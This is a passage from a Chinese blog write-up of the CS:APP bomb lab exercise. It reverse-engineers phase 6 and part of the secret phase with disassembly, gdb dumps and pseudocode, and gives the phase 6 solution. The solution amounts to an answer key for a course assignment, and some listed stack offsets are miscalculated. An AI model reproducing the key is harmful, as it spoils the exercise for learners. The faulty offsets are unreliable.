&lt;li&gt;&lt;code&gt;r14 = rsp = rsi = r13&lt;/code&gt;，&lt;code&gt;r12d = 0&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下面进入 seg 2，其做的工作是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;让&lt;code&gt;rbp = r13&lt;/code&gt;，那么现在&lt;code&gt;r13 = r14 = rsi = rsp = rbp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;让&lt;code&gt;eax = r13所指向的值&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;判断&lt;code&gt;eax - 1&lt;/code&gt;是否小于等于 5，如果&lt;code&gt;eax - 1 &amp;gt; 5&lt;/code&gt;，那么炸弹爆炸，也就是说&lt;code&gt;eax&lt;/code&gt;必须小于等于 6&lt;/li&gt;
&lt;li&gt;正常情况下，进入 seg 3&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;进入 seg 3 分析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;r12d += 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;r12d&lt;/code&gt;与 6 比较，如果&lt;code&gt;r12d ！= 6&lt;/code&gt;，那么&lt;code&gt;ebx = r12d&lt;/code&gt;，随后进入 seg 4(proc 2 中)&lt;/li&gt;
&lt;li&gt;否则就进入 seg 6(proc 3 中)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这里我们分析得到的结果是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;seg 1 中进行了一些初始化的工作，让几个指针都指向输入数字的起始位置，并且让计数值&lt;code&gt;r12d = 0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;seg 2 中让&lt;code&gt;rbp 指向 r13所指向的位置&lt;/code&gt;(一开始&lt;code&gt;r13 = r14 = rsp = rsi&lt;/code&gt;，因为后面还有进入&lt;code&gt;seg 2&lt;/code&gt;的部分，所以不确定&lt;code&gt;r13&lt;/code&gt;的指向会不会改变，先看看)，让&lt;code&gt;eax = r13所指向的值&lt;/code&gt;，并且保证其必须小于等于 6&lt;/li&gt;
&lt;li&gt;seg 3 中让&lt;code&gt;r12d&lt;/code&gt;计数值增加，判断&lt;code&gt;r12d是否等于6&lt;/code&gt;。如果不等于 6，就让其等于&lt;code&gt;ebx&lt;/code&gt;，然后进入&lt;code&gt;seg 4&lt;/code&gt;；否则进&lt;code&gt;seg 6&lt;/code&gt;（看流程图可以看出，seg 6 离终点要更进一步，而 seg 4 在进入后做一些循环的工作后又会回到 seg 2，故我猜测这里 seg 4 以后的步骤是做了一些遍历的工作，但是在遍历的而过程中是读还是修改暂不清楚）&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;Proc-2&#34;&gt;&lt;a href=&#34;#Proc-2&#34; class=&#34;headerlink&#34; title=&#34;Proc 2&#34;&gt;&lt;/a&gt;Proc 2&lt;/h3&gt;&lt;p&gt;接下来我们进入 seg 4：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;我们首先让&lt;code&gt;rax = ebx&lt;/code&gt;(注意前面&lt;code&gt;ebx = r12d&lt;/code&gt;,此时&lt;code&gt;r12d&lt;/code&gt;已经递增到下一个位置了)，那么这里&lt;code&gt;rax = ebx = r12d&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;让&lt;code&gt;eax = *(rsp + 4 * rax)&lt;/code&gt;，因为 rsp 是输入数字的起始位置，那么 rax 应该是一个索引，因为输入的是&lt;code&gt;int&lt;/code&gt;类型，所以每次要 &lt;code&gt;* 4&lt;/code&gt;。假定输入的数字的字符串叫&lt;code&gt;str&lt;/code&gt;，那么这里就是&lt;code&gt;eax = str[rax]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;判断&lt;code&gt;rbp 指向的值是否等于eax&lt;/code&gt;，前文中我们可以看到&lt;code&gt;rbp&lt;/code&gt;指向的是&lt;code&gt;r13&lt;/code&gt;所指向的位置，也就是让你判断&lt;code&gt;r13&lt;/code&gt;指向位置的值是否等于&lt;code&gt;eax&lt;/code&gt;，也就是前面的&lt;code&gt;str[rax]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;如果不相等，进入 seg 5，否则炸弹爆炸(下面那个图中的有点错误，菱锌框中应该是不相等)，我们可以初步判断，这里两个相邻的值应该是不能相等的（其他不相邻的能不能相等等会儿再看，如果&lt;code&gt;r13&lt;/code&gt;改变的话，那么不相邻的值应该也不能像等）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;就接下来我们进入 seg 5：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;ebx += 1&lt;/code&gt;（还记得&lt;code&gt;ebx&lt;/code&gt;是什么吗？&lt;code&gt;ebx = r12d&lt;/code&gt;！在前文中&lt;code&gt;r12d&lt;/code&gt;已经向前跃进了一个位置，那么现在&lt;code&gt;ebx&lt;/code&gt;还要比&lt;code&gt;r12d&lt;/code&gt;再进一个位置）&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;ebx 和 0x5&lt;/code&gt;相比较，如果&lt;code&gt;ebx &amp;lt;= 0x5&lt;/code&gt;，也就是说如果之前的&lt;code&gt;ebx &amp;lt;= 0x6&lt;/code&gt;的话，继续回到 seg 4。否则&lt;code&gt;r13 += 4&lt;/code&gt;（&lt;code&gt;r13&lt;/code&gt;果然改变了，向前跃进了 4 个字节，也就是一个 int 类型的大小），然后回到 seg 2&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这个过程我们分析得到的结果是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;seg 4 让&lt;code&gt;rax = ebx = r12d&lt;/code&gt;，然后让&lt;code&gt;rax = str[rax]&lt;/code&gt;，判断&lt;code&gt;rbp/r13&lt;/code&gt;指向的值是否等于&lt;code&gt;eax&lt;/code&gt;。相等就爆炸，不相等就进 seg 5&lt;/li&gt;
&lt;li&gt;seg 5 判断之前的&lt;code&gt;ebx&lt;/code&gt;是否小于等于 0x6，&lt;code&gt;r12d&lt;/code&gt;比&lt;code&gt;ebx&lt;/code&gt;小 1。如果&lt;code&gt;ebx &amp;lt;= 0x6&lt;/code&gt;的话，回到 seg 4。seg 4 中还要判断下一个位置的数字和&lt;code&gt;r13/rbp&lt;/code&gt;所指向的数字是否相等，相等就爆炸。否则&lt;code&gt;r13&lt;/code&gt;指向下一个数字的位置，回到 seg 2。seg 2 中又要判断下一个数字是否小于等于 6，以及其和后面的数字是否相等。&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;到这里我们可以初步判断，r13&amp;#x2F;rbp 是用于指向被比较的基准数，是指针。ebx&amp;#x2F;r12d 是用来递增的数组索引，是数字。获取到的数字通常被赋给 rax。输入的数字不能有相等的，也必须都小于等于 6。Proc 1 和 Proc 2 主要执行了一些检查的工作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;Proc-3&#34;&gt;&lt;a href=&#34;#Proc-3&#34; class=&#34;headerlink&#34; title=&#34;Proc 3&#34;&gt;&lt;/a&gt;Proc 3&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从前文我们可以判断出，当进入 seg 6 的时候，r12d 肯定是等于 6 了，r13&amp;#x2F;rbp 也指向了最后一个数字。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在 seg 6 中：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;我们让&lt;code&gt;rsi&lt;/code&gt;指向最后一个数字的下一个位置，让&lt;code&gt;rax = r14&lt;/code&gt;,&lt;code&gt;ecx = 7&lt;/code&gt;（&lt;code&gt;r14&lt;/code&gt;一开始是指向&lt;code&gt;rsp&lt;/code&gt;的，这两个值是什么含义这里还没有完全清楚）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在 seg 7 中：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;我们让&lt;code&gt;edx = ecx&lt;/code&gt;（&lt;code&gt;edx = ecx = 7&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;edx = edx - *rax&lt;/code&gt;，这里&lt;code&gt;rax&lt;/code&gt;指向数组的开头，也就是让&lt;code&gt;edx&lt;/code&gt;作为 7 和&lt;code&gt;rax&lt;/code&gt;指向的当前值的差&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*rax = edx&lt;/code&gt;，也就是让&lt;code&gt;rax&lt;/code&gt;指向的值 &amp;#x3D; 这个差&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rax&lt;/code&gt;指向下一个位置，比较&lt;code&gt;rax&lt;/code&gt;和&lt;code&gt;rsi&lt;/code&gt;，也就是判断是否到达了数组的末尾&lt;/li&gt;
&lt;li&gt;如果没有到达（&lt;code&gt;rax&lt;/code&gt;还没有到达数组末尾&lt;code&gt;rsi&lt;/code&gt;），就回到 seg 7，继续让每个数组的值 &amp;#x3D; 7 - 它的值&lt;/li&gt;
&lt;li&gt;否则 &lt;code&gt;esi = 0&lt;/code&gt;，跳到&lt;code&gt;seg 11&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;在这个子过程中，我们让每个数组的值都等于 7-它原本的值，遍历完成后 rax 指向数组末尾，r14 和 rsp 还在开头，esi &amp;#x3D; 0&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;Proc-4&#34;&gt;&lt;a href=&#34;#Proc-4&#34; class=&#34;headerlink&#34; title=&#34;Proc 4&#34;&gt;&lt;/a&gt;Proc 4&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;这个过程有点复杂，要慢慢来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在 seg 11 中：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;我们让&lt;code&gt;ecx的值 = *(rsp + rsi)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;ecx&lt;/code&gt;和 &lt;code&gt;0x1&lt;/code&gt; 比较，如果&lt;code&gt;ecx &amp;lt;= 0x1&lt;/code&gt;的话，跳转到 seg 9&lt;/li&gt;
&lt;li&gt;否则 eax &amp;#x3D; 1, edx &amp;#x3D; &lt;code&gt;0x6032d0&lt;/code&gt;，跳转到 seg 8&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;因为 seg 9 离终点更近，因此我们首先分析 seg 8，也就是&lt;code&gt;7 - str[i] &amp;gt; 1 -&amp;gt; value &amp;lt; 6&lt;/code&gt;的情况。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;rdx = *(rdx + 8)&lt;/code&gt;，也就是说&lt;code&gt;rdx&lt;/code&gt;的值 &amp;#x3D; 离&lt;code&gt;rdx&lt;/code&gt;8 个字节的位置的值(大概率是个指针，因为需要解引，而且指针是 8 个字节对齐)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;eax += 1&lt;/code&gt;，将&lt;code&gt;ecx&lt;/code&gt;和&lt;code&gt;eax&lt;/code&gt;比较（这里 eax 已经从 2 开始了），如果&lt;code&gt;eax&lt;/code&gt;还不等于&lt;code&gt;ecx&lt;/code&gt;，那么回到 seg 8，否则到 seg 10&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;seg 8 的含义为，从第一个差开始，如果当前这个差的值 &amp;gt; 0x1 的话，一直寻找这个差的值的位置，保存在&lt;code&gt;rdx&lt;/code&gt;中，并且这个差的值在&lt;code&gt;rax&lt;/code&gt;中。&lt;/p&gt;
&lt;p&gt;同时我们来分析 seg 9，seg 9 中&lt;code&gt;edx = 0x6032d0&lt;/code&gt;，直接进入 seg 10&lt;/p&gt;
&lt;p&gt;seg 10 的操作是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;*(rsp + rsi * 2 + 32) = rdx&lt;/code&gt;,这里 rsi 的值 &amp;#x3D; 之前计算出的索引值（最开始是 0），rsp 的值 &amp;#x3D; 输入数字的位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsi = rsi + 4&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;rsi&lt;/code&gt;和 24 比较，如果&lt;code&gt;rsi != 24&lt;/code&gt;，即所有数字还没遍历完，退回到 seg 11&lt;/li&gt;
&lt;li&gt;否则进入 seg 12&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那么总结来说，这三个段的含义如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;seg 11 让&lt;code&gt;ecx = str[rsi]&lt;/code&gt;，将其和&lt;code&gt;0x1&lt;/code&gt;作比较&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;ecx &amp;lt;= 0x1&lt;/code&gt;时，跳转到 seg 9，令&lt;code&gt;edx = 0x6032d0&lt;/code&gt;，随后进入 seg 10&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;ecx &amp;gt; 0x1&lt;/code&gt;时，&lt;code&gt;eax = 1, edx = 0x6032d0&lt;/code&gt;，跳转到 seg 8，seg 8 中从第一个值开始一直寻找第&lt;code&gt;ecx&lt;/code&gt;个值的位置，并保存在&lt;code&gt;rdx&lt;/code&gt;中，进入 seg 10&lt;/li&gt;
&lt;li&gt;seg 10 中我们把该数字的地址都存储在&lt;code&gt;*(起始地址 + 2 * 索引 + 32)&lt;/code&gt;位置处，如果数字遍历完了，就进入 seg 12，否则就回退到 seg 11&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;大概明白了，这里作者可能是想构建一个链表，他把链表的所有结点的起始地址放在一个数组里了！放置的顺序是我们输入的数字串的顺序！比如&lt;code&gt;rsi = 0&lt;/code&gt;时，读入第&lt;code&gt;ecx&lt;/code&gt;个数字，那么根据这个数字找到的&lt;code&gt;edx&lt;/code&gt;就存储在地址数组的第一行。每个数字的地址都存储在&lt;code&gt;起始地址 + 32 + 2 * 索引&lt;/code&gt;的位置。（为什么是这个还不太理解）&lt;/p&gt;
&lt;p&gt;到这里结束，6 个数字的位置分别存储的&lt;code&gt;rsi&lt;/code&gt;是：&lt;code&gt;0 4 8 12 16 20 24&lt;/code&gt;，其偏移量是&lt;code&gt;0 8 16 25 32 40 48&lt;/code&gt;,加上 32 后相距&lt;code&gt;rsp&lt;/code&gt;的偏移量是：&lt;code&gt;32 40 48 57 72 80&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们从&lt;code&gt;0x6032d0&lt;/code&gt;开始，每次打印 16 个字节（小端序），前 8 个字节是数字的值，后 8 个字节是下一个结点的地址，其顺序如下：&lt;br&gt;第一个结点从&lt;code&gt;0x6032d0&lt;/code&gt;开始：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/16xb 0x6032d0
0x6032d0 &amp;lt;node1&amp;gt;:       0x4c    0x01    0x00    0x00    0x01    0x00    0x00    0x00
0x6032d8 &amp;lt;node1+8&amp;gt;:     0xe0    0x32    0x60    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那么第二个结点的地址应该是&lt;code&gt;0x6032e0&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/16xb 0x6032e0
0x6032e0 &amp;lt;node2&amp;gt;:       0xa8    0x00    0x00    0x00    0x02    0x00    0x00    0x00
0x6032e8 &amp;lt;node2+8&amp;gt;:     0xf0    0x32    0x60    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第三个结点的地址应该是&lt;code&gt;0x6032f0&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/16xb 0x6032f0
0x6032f0 &amp;lt;node3&amp;gt;:       0x9c    0x03    0x00    0x00    0x03    0x00    0x00    0x00
0x6032f8 &amp;lt;node3+8&amp;gt;:     0x00    0x33    0x60    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第四个结点的地址应该是&lt;code&gt;0x603300&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/16xb 0x603300
0x603300 &amp;lt;node4&amp;gt;:       0xb3    0x02    0x00    0x00    0x04    0x00    0x00    0x00
0x603308 &amp;lt;node4+8&amp;gt;:     0x10    0x33    0x60    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第五个结点的地址应该是&lt;code&gt;0x603310&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x603310 &amp;lt;node5&amp;gt;:       0xdd    0x01    0x00    0x00    0x05    0x00    0x00    0x00
0x603318 &amp;lt;node5+8&amp;gt;:     0x20    0x33    0x60    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第六个结点的地址应该是&lt;code&gt;0x603320&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/16xb 0x603320
0x603320 &amp;lt;node6&amp;gt;:       0xbb    0x01    0x00    0x00    0x06    0x00    0x00    0x00
0x603328 &amp;lt;node6+8&amp;gt;:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Proc-5&#34;&gt;&lt;a href=&#34;#Proc-5&#34; class=&#34;headerlink&#34; title=&#34;Proc 5&#34;&gt;&lt;/a&gt;Proc 5&lt;/h3&gt;&lt;p&gt;在这个子过程中，我们首先进入 seg12，经过一个看起来是循环的东西，再从 seg 14 出去。&lt;/p&gt;
&lt;p&gt;seg 12 的过程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;rbx = *(rsp + 32)&lt;/code&gt; &amp;#x2F;&amp;#x2F; rbx &amp;#x3D; 起始位置的值（链表第一个结点的地址）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rax = rsp + 40&lt;/code&gt; &amp;#x2F;&amp;#x2F; 第 2 个值（链表第二个结点的地址）的位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsi = rsp + 80&lt;/code&gt; &amp;#x2F;&amp;#x2F; 最后一个数（最后一个结点的地址）的位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rcx = rbx&lt;/code&gt; &amp;#x2F;&amp;#x2F; rcx &amp;#x3D; rbx &amp;#x3D; 起始位置的值（第一个结点的地址）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;随后进入 seg 13，seg 13 的过程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;rdx = *rax&lt;/code&gt; &amp;#x2F;&amp;#x2F; rdx &amp;#x3D; rax 位置的值&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*(rcx + 8) = rdx&lt;/code&gt; &amp;#x2F;&amp;#x2F; rcx 指向的下一个位置的值是 rdx&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rax += 8&lt;/code&gt; &amp;#x2F;&amp;#x2F; rax &amp;#x3D; 下一个位置&lt;/li&gt;
&lt;li&gt;如果 rax &amp;#x3D;&amp;#x3D; rsi，进入 seg 14，否则&lt;code&gt;rcx = rdx&lt;/code&gt;，重新回到 seg 13&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;这里把链表中的结点都串起来啦！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;seg 14 的过程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;*(rdx + 8) = 0&lt;/code&gt; &amp;#x2F;&amp;#x2F; 把链表最后一个节点的 next 域置为 0&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ebp = 5&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;随后进入 seg 15。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;现在 rbx 的值等于链表第一个结点的地址，rcx 的值等于链表倒数第二个结点的地址，rdx 的值等于链表最后一个结点的地址，rsi 和 rax 指向链表的最后，ebp &amp;#x3D; 5&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;Proc-6&#34;&gt;&lt;a href=&#34;#Proc-6&#34; class=&#34;headerlink&#34; title=&#34;Proc 6&#34;&gt;&lt;/a&gt;Proc 6&lt;/h3&gt;&lt;p&gt;seg 15 中完成了以下步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;rax = *(rbx + 8)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;eax = *rax&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;如果 &lt;code&gt;*rbx &amp;gt;= eax&lt;/code&gt;，进入 seg 16&lt;/li&gt;
&lt;li&gt;否则炸弹爆炸&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这里说明第一个结点的值必须大于等于第二个结点，否则炸弹爆炸。&lt;/p&gt;
&lt;p&gt;seg 16 中执行以下步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;rbx = *(rbx + 8)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ebp -&amp;#x3D; 1&lt;/li&gt;
&lt;li&gt;如果 ebp !&amp;#x3D; 0，进入 seg 15&lt;/li&gt;
&lt;li&gt;否则栈恢复&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这段说明链表的值从开始到后面必须严格递减。我们在前期已经获得了链表各个结点的值，我们只需要从大到小排列这些值即可，炸弹的密码是排列的顺序。这组值是&lt;code&gt;0x014c 0x00a8 0x039c 0x02b3 0x01dd 0x01bb&lt;/code&gt;，翻译成十进制就是&lt;code&gt;332 168 924 691 477 443&lt;/code&gt;(可以使用&lt;code&gt;x/96dh 0x6032d0&lt;/code&gt;打印&lt;code&gt;halfword&lt;/code&gt;)，gdb 的 x 命令打印的字节数如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;b - byte
h - halfword (16-bit value)
w - word (32-bit value)
g - giant word (64-bit value)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以数字从大到小的顺序应该是&lt;code&gt;3 4 5 6 1 2&lt;/code&gt;，但是因为&lt;code&gt;ecx&lt;/code&gt;的值是&lt;code&gt;7 - 原来的值&lt;/code&gt;，所以原来的值应该是&lt;code&gt;4 3 2 1 6 5&lt;/code&gt;。成功解除炸弹！&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;重点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;这个过程就是第&lt;code&gt;ecx&lt;/code&gt;个数的&lt;code&gt;rdx&lt;/code&gt;（链表结点地址）存储在地址数组的第&lt;code&gt;rsi&lt;/code&gt;位，实现了链表结点的重排序！&lt;/li&gt;
&lt;li&gt;最后记得第&lt;code&gt;ecx&lt;/code&gt;个数 &amp;#x3D; 7 - 原来的值，所以我们解出了链表中元素的值后，还要用 7 - 它 来获得我们原来输入的数&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;secret-phase-分析&#34;&gt;&lt;a href=&#34;#secret-phase-分析&#34; class=&#34;headerlink&#34; title=&#34;secret phase 分析:&#34;&gt;&lt;/a&gt;secret phase 分析:&lt;/h2&gt;&lt;p&gt;对&lt;code&gt;secret phase&lt;/code&gt;执行反汇编得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000401242 &amp;lt;secret_phase&amp;gt;:
seg1:
  401242:	53                   	push   %rbx
  401243:	e8 56 02 00 00       	callq  40149e &amp;lt;read_line&amp;gt;
  401248:	ba 0a 00 00 00       	mov    $0xa,%edx
  40124d:	be 00 00 00 00       	mov    $0x0,%esi
  401252:	48 89 c7             	mov    %rax,%rdi
  401255:	e8 76 f9 ff ff       	callq  400bd0 &amp;lt;strtol@plt&amp;gt;
  40125a:	48 89 c3             	mov    %rax,%rbx
  40125d:	8d 40 ff             	lea    -0x1(%rax),%eax
  401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax
  401265:	76 05                	jbe    40126c &amp;lt;secret_phase+0x2a&amp;gt;
  401267:	e8 ce 01 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
seg2:
  40126c:	89 de                	mov    %ebx,%esi
  40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi
  401273:	e8 8c ff ff ff       	callq  401204 &amp;lt;fun7&amp;gt;
  401278:	83 f8 02             	cmp    $0x2,%eax
  40127b:	74 05                	je     401282 &amp;lt;secret_phase+0x40&amp;gt;
  40127d:	e8 b8 01 00 00       	callq  40143a &amp;lt;explode_bomb&amp;gt;
seg3:
  401282:	bf 38 24 40 00       	mov    $0x402438,%edi
  401287:	e8 84 f8 ff ff       	callq  400b10 &amp;lt;puts@plt&amp;gt;
  40128c:	e8 33 03 00 00       	callq  4015c4 &amp;lt;phase_defused&amp;gt;
  401291:	5b                   	pop    %rbx
  401292:	c3                   	retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其过程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;压入&lt;code&gt;%rbx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;读入一行 -&amp;gt; 估计结果存储在 rax 中，也就是字符串的起始位置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;edx = 0xa&lt;/code&gt;，&lt;code&gt;esi = 0&lt;/code&gt;，&lt;code&gt;rdi = rax&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;strtol&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rbx = rax&lt;/code&gt; -&amp;gt; rbx &amp;#x3D; 字符串转化出的数值&lt;/li&gt;
&lt;li&gt;&lt;code&gt;eax = rax - 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;eax &amp;lt;= 0x3e8&lt;/code&gt;，跳转到 seg 2；否则炸弹爆炸&lt;/li&gt;
&lt;li&gt;&lt;code&gt;esi = ebx&lt;/code&gt;，&lt;code&gt;edi = 0x6030f0&lt;/code&gt;，调用&lt;code&gt;fun7&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;eax == 0x2&lt;/code&gt;，跳转到 seg 3（炸弹解除），否则炸弹爆炸&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;将其转化为 C 语言：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;int secret_phase(char* buf)
&amp;#123;
    // 压入rbx
    rax = call read_line
    edx = 0xa
    esi = 0
    rdi = rax
    call strtol
    rbx = rax
    eax = rax - 1 //输入数字必须小于等于 1000
    if(eax &amp;lt;= 0x3e8) &amp;#123;
        // seg2
        esi = ebx
        edi = 0x6030f0
        call fun7
        if(eax == 0x2) &amp;#123;
            return eax;
        &amp;#125;
        else &amp;#123;
            call bomb_explode
        &amp;#125;
    &amp;#125;
    else &amp;#123;
        call bomb_explode
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们首先解读一下&lt;code&gt;secret_phase&lt;/code&gt;：&lt;br&gt;一开始几个寄存器的值如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rax - read line 返回的字符串地址
edx - 0xa
esi - 0
rdi - read line 返回的字符串地址
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;调用&lt;code&gt;strtol&lt;/code&gt;后几个寄存器的值如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rax - strtol 返回的字符串转化出的数值
rbx - strtol 返回的字符串转化出的数值
eax - 数值 - 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果该数值 - 1 &amp;gt; 0x3e8(1000)，炸弹爆炸，否则进入 seg 2。&lt;/p&gt;
&lt;p&gt;seg 2 中完成了如下工作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;esi = strtol 返回的字符串转化出的数值&lt;/code&gt;（这个数必须小于等于 1001）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;edi = 0x6030f0&lt;/code&gt;(一个地址)&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;fun7&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;fun7&lt;/code&gt;返回 2，退出，否则炸弹爆炸&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这其中调用了一个叫&lt;code&gt;fun7&lt;/code&gt;的函数，其反汇编结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0000000000401204 &amp;lt;fun7&amp;gt;:
seg1:
  401204:	48 83 ec 08          	sub    $0x8,%rsp
  401208:	48 85 ff             	test   %rdi,%rdi
  40120b:	74 2b                	je     401238 &amp;lt;fun7+0x34&amp;gt;
  40120d:	8b 17                	mov    (%rdi),%edx
  40120f:	39 f2                	cmp    %esi,%edx
  401211:	7e 0d                	jle    401220 &amp;lt;fun7+0x1c&amp;gt;
  401213:	48 8b 7f 08          	mov    0x8(%rdi),%rdi
  401217:	e8 e8 ff ff ff       	callq  401204 &amp;lt;fun7&amp;gt;
  40121c:	01 c0                	add    %eax,%eax
  40121e:	eb 1d                	jmp    40123d &amp;lt;fun7+0x39&amp;gt;
seg2:
  401220:	b8 00 00 00 00       	mov    $0x0,%eax
  401225:	39 f2                	cmp    %esi,%edx
  401227:	74 14                	je     40123d &amp;lt;fun7+0x39&amp;gt;
  401229:	48 8b 7f 10          	mov    0x10(%rdi),%rdi
  40122d:	e8 d2 ff ff ff       	callq  401204 &amp;lt;fun7&amp;gt;
  401232:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax
  401236:	eb 05                	jmp    40123d &amp;lt;fun7+0x39&amp;gt;
seg3:
  401238:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
seg4:
  40123d:	48 83 c4 08          	add    $0x8,%rsp
